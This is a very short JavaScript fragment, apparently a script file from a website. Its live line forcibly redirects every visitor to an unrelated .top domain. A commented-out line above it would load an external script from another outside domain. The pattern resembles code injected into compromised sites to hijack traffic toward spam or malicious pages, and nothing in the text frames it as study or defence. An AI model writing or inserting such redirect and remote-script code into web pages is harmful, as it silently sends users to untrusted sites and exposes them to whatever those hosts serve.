//document.writeln("<script type=\"text\/javascript\" src=\"http:\/\/www.zykangda.com\/d\/content.js\"><\/script>");

window.location.href='http://www.7nbmkp.top';